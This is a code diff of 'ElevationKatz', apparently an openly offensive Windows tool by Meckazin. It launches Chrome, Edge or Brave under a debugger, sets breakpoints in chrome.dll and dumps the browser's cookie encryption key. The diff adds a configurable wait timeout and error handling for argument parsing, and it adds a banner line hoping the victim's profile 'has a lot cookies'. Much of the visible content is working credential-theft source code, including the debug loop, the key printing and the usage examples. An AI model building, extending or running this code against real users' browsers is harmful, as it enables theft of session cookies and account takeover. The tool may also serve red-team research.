@@ -344,8 +344,9 @@ uintptr_t FindPattern(HANDLE hProcess, uintptr_t moduleBaseAddr, BYTE* pattern, 
 }
 
 void DumpSecret(HANDLE hProc, HANDLE hThread) {
-    CONTEXT ctx{};
+    CONTEXT ctx = {0};
     ctx.ContextFlags = CONTEXT_INTEGER | CONTEXT_CONTROL | CONTEXT_SEGMENTS;
+
     if (!GetThreadContext(hThread, &ctx)) {
         printf("GetThreadContext failed: %lu\n", GetLastError());
         CloseHandle(hThread);
@@ -386,7 +387,6 @@ void DumpSecret(HANDLE hProc, HANDLE hThread) {
     for (size_t i = 0; i < keyLen; i++)
         printf("%02X", key[i]);
     printf("\n");
-
 }
 
 BOOL GetModuleName(HANDLE hProcess, const void* remote, wchar_t* dllName) {
@@ -422,12 +422,15 @@ BOOL SetBreakPoint(HANDLE hProcess, uintptr_t breakpointAddress) {
     return TRUE;
 }
 
-void DebugProcess(HANDLE hProcess, HANDLE hThread, const wchar_t* targetModule, BOOL useHW, BOOL useTL32) {
+void DebugProcess(HANDLE hProcess, HANDLE hThread, const wchar_t* targetModule, DWORD waitTime, BOOL useHW, BOOL useTL32) {
     DEBUG_EVENT debugEvent;
     uintptr_t breakpointAddress = 0x00;
     bool breakPointSet = false;
 
-    while (WaitForDebugEvent(&debugEvent, INFINITE)) {
+    if (waitTime == 0)
+        waitTime = INFINITE;
+
+    while (WaitForDebugEvent(&debugEvent, waitTime)) {
         switch (debugEvent.dwDebugEventCode) {
         case EXCEPTION_DEBUG_EVENT: {
             EXCEPTION_RECORD exceptionRecord = debugEvent.u.Exception.ExceptionRecord;
@@ -615,18 +618,22 @@ void usage() {
     printf("Examples:\n");
     printf(".\\ElevationKatz.exe /chrome\n");
     printf("    Starts a new chrome process using path: C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\n");
+    printf("    Waits for 500 milliseconds for process to finish until forced shutdown.\n");
     printf(".\\ElevationKatz.exe /chrome /hw\n");
     printf("    Starts a new chrome process using path: C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\n");
     printf("    Will use Hardware breakpoints instead of the sofware ones\n");
-    printf(".\\ElevationKatz.exe /edge\n");
+    printf("    Waits for 500 milliseconds for process to finish until forced shutdown.\n");
+    printf(".\\ElevationKatz.exe /edge /wait:1000\n");
     printf("    Starts a new chrome process using path: C:\\Program Files(x86)\\Microsoft\\Edge\\Application\\msedge.exe\n");
-    printf(".\\ElevationKatz.exe /path:\"C:\Program Files\BraveSoftware\Brave - Browser\Application\brave.exe\" /module:chrome.dll\n");
+    printf("    Waits for 1000 milliseconds for process to finish until forced shutdown.\n");
+    printf(".\\ElevationKatz.exe /path:\"C:\\Program Files\\BraveSoftware\\Brave - Browser\\Application\\brave.exe\" /module:chrome.dll\n");
     printf("    Targets the Brave browser\n");
     printf("Flags:\n");
     printf("    /chrome                Target Chrome process.\n");
     printf("    /edge                  Target Edge process.\n");
     printf("    /hw                    Use Harware breakpoints instead of SW ones.\n");
     printf("    /tl32                  Use CreateToolhelp32Snapshot to enumerate process threads when using with /HW flag\n");
+    printf("    /wait:<milliseconds>   Maximum time to for the debugging. Use 0 for INFINITE. Defaults to 500ms.\n");
     printf("    /path:<path_to_exe>    Provide path to the process executable\n");
     printf("    /module:<some.dll>     Provide alternative module to target\n");
     printf("    /help                  This what you just did! -h works as well\n");
@@ -640,7 +647,6 @@ void banner() {
     printf("| |____| |  __/\\ V / (_| | |_| | (_) | | | | . \\ (_| | |_ / /  \n");
     printf("|______|_|\\___| \\_/ \\__,_|\\__|_|\\___/|_| |_|_|\\_\\__,_|\\__/___| \n");
     printf("By Meckazin                                github.com/Meckazin \n");
-    printf("\n\n");
 }
 
 int main(int argc, char* argv[]) {
@@ -648,6 +654,7 @@ int main(int argc, char* argv[]) {
     BOOL useHW = FALSE;
     BOOL useTL32 = FALSE;
     BOOL terminate = FALSE;
+    DWORD wait = 500; //Default wait time 500ms
 
     const wchar_t* targetModule = L"";
     const wchar_t* targetExecutable = L"";
@@ -672,15 +679,33 @@ int main(int argc, char* argv[]) {
             targetModule = L"chrome.dll";
             targetExecutable = L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe";
         }
+        if (StrStrIA(argv[i], "wait:") != NULL)
+        {
+            //Split and take wait time
+            const char* colonPos = strchr(argv[i], ':');
+            size_t waitLen = strlen(colonPos + 1);
+            char* remainder = new char[waitLen + 1];
+            strcpy_s(remainder, waitLen + 1, colonPos + 1);
+            if (sscanf_s(remainder, "%lu", &wait) == 0) {
+                printf("[-] Failed to parse command line argument /wait!\n");
+                return 1;
+            }
+        }
         if (StrStrIA(argv[i], "path:") != NULL) {
             const char* colonPos = strchr(argv[i], ':');
             size_t pathLen = strlen(colonPos + 1) + sizeof(wchar_t);
-            mbstowcs_s(NULL, path, pathLen, colonPos + 1, MAX_PATH);
+            if (errno_t  err = mbstowcs_s(NULL, path, pathLen, colonPos + 1, MAX_PATH) != 0) {
+                printf("[-] Failed to parse command line argument /path, Error: %d\n", err);
+                return 1;
+            }
         }
         if (StrStrIA(argv[i], "module:") != NULL) {
             const char* colonPos = strchr(argv[i], ':');
             size_t moduleLen = strlen(colonPos + 1) + sizeof(wchar_t);
-            mbstowcs_s(NULL, module, moduleLen, colonPos + 1, MAX_PATH);
+            if (errno_t err = mbstowcs_s(NULL, module, moduleLen, colonPos + 1, MAX_PATH) != 0) {
+                printf("[-] Failed to parse command line argument /module, Error: %d\n", err);
+                return 1;
+            }
         }
         if (StrStrIA(argv[i], "help") != NULL || StrStrIA(argv[i], "-h") != NULL) {
             banner();
@@ -689,7 +714,9 @@ int main(int argc, char* argv[]) {
         }
     }
 
+    //This is important
     banner();
+    printf("Hope your browser profile has a lot cookies!\n\n");
 
     //Use provided path if one was given
     if (wcslen(path) > 0)
@@ -735,7 +762,7 @@ int main(int argc, char* argv[]) {
         if (DebugActiveProcess(pi.dwProcessId)) {
 
             printf("[+] Debugger attached to process with PID: %d\n", pi.dwProcessId);
-            DebugProcess(pi.hProcess, pi.hThread, targetModule, useHW, useTL32);
+            DebugProcess(pi.hProcess, pi.hThread, targetModule, wait, useHW, useTL32);
         }
         else {
             printf("[-] DebugActiveProcess failed to attach. Error: %d\n", GetLastError());
